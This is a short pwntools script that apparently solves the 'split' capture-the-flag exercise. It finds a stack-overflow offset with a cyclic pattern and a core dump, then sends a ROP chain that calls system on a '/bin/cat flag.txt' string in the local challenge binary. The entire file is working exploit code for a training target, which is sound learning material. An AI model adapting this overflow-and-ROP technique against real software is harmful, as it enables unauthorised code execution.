#!/usr/bin/env python2

from pwn import *

p = process('./split')

context.log_level = 'debug'
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

p.sendline(cyclic(128))
log.info('Sending cyclic data')

p.wait()

core = p.corefile

stack = core.rsp
log.info("stack: %#x", stack)

pattern = core.read(stack,4)

offset = cyclic_find(pattern)
log.info("pattern %r",pattern)


rop_chain = p64(0x00400883,endian = "little") #adds address of pop rdi; ret;
rop_chain += p64(0x00601060,endian = "little") # adds "bin/cat flag.txt
rop_chain += p64(0x00400810,endian = "little") # adds system call
rop_chain += p64(0x42424242,endian = "little")

padding = cyclic(offset)

payload = padding + rop_chain

p = process('./split')

p.sendline(payload)
p.wait_for_close()
p.recv()